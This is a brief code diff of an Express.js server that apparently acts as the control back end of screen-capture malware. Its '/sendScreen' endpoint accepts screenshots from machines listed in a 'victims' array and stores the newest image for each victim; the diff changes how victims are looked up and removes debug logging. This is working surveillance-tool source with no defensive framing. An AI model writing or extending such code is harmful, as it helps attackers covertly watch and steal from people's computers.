@@ -80,10 +80,8 @@ app.get('/getMyTasks', async (req,res) => {
 app.post('/sendScreen', async (req,res) => {
     if (req && req.body && req.body.image && req.body.uuid && req.body.photoId) {
       console.log(req.body)
-      const victim = victims.find(potentialVictim => potentialVictim.uuid === req.body.uuid)
+      const victim = victims.find(potentialVictim => potentialVictim.uuid === req.body.victim)
       console.log(victim)
-      console.log(victim.photoId)
-      console.log(req.body.photoId)
       if (victim && victim.photoId && victim.photoId < req.body.photoId) {
         victim.currentPhoto = req.body.image
         victim.photoId = req.body.photoId
